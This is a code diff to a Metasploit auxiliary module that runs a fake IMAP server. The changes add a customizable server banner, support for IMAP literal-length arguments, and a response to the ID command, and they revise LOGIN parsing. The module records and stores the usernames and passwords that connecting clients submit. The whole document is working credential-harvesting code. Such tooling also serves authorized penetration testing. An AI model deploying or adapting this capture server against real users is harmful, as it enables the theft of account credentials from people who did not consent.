@@ -18,7 +18,7 @@ class MetasploitModule < Msf::Auxiliary
       'License'     => MSF_LICENSE,
       'Actions'     =>
         [
-          [ 'Capture' ]
+          [ 'Capture', 'Description' => 'Run IMAP capture server' ]
         ],
       'PassiveActions' =>
         [
@@ -29,7 +29,8 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 143 ])
+        OptPort.new('SRVPORT',  [ true, "The local port to listen on.", 143 ]),
+        OptString.new('BANNER', [ true, "The server banner",  'IMAP4'])
       ])
   end
 
@@ -39,20 +40,45 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
     exploit()
   end
 
   def on_client_connect(c)
     @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
-    c.put "* OK IMAP4\r\n"
+    c.put "* OK #{datastore['BANNER']}\r\n"
   end
 
   def on_client_data(c)
     data = c.get_once
     return unless data
     num, cmd, arg = data.strip.split(/\s+/, 3)
-    arg ||= ""
+    cmd ||= ''
+    arg ||= ''
+    args = []
+
+    # If the argument is a number in braces, such as {3}, it means data is coming
+    # separately
+    if arg.chomp =~ /\{[0-9]+\}$/
+      loop do
+        # Ask for more data
+        c.put "+ \r\n"
+
+        # Get the next line
+        arg = (c.get_once || '').chomp
+
+        # Remove the length field, if there is one
+        if arg =~ /(.*) \{[0-9]+\}$/
+          args << $1
+        else
+          # If there's no length field, we're at the end
+          args << arg
+          break
+        end
+      end
+    else
+      # If there's no length, treat it like we used to
+      args = arg.split(/\s+/)
+    end
 
     if cmd.upcase == 'CAPABILITY'
       c.put "* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS " +
@@ -74,16 +100,23 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if cmd.upcase == 'LOGIN'
-      @state[c][:user], @state[c][:pass] = arg.split(/\s+/, 2)
-
+      @state[c][:user], @state[c][:pass] = args
       register_creds(@state[c][:ip], @state[c][:user], @state[c][:pass], 'imap')
-      print_status("IMAP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+      print_good("IMAP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+
       return
     end
 
     if cmd.upcase == 'LOGOUT'
       c.put("* BYE IMAP4rev1 Server logging out\r\n")
       c.put("#{num} OK LOGOUT completed\r\n")
+      return
+    end
+
+    if cmd.upcase == 'ID'
+      # RFC2971 specifies the ID command, and `NIL` is a valid response
+      c.put("* ID NIL\r\n")
+      c.put("#{num} OK ID completed\r\n")
       return
     end
 
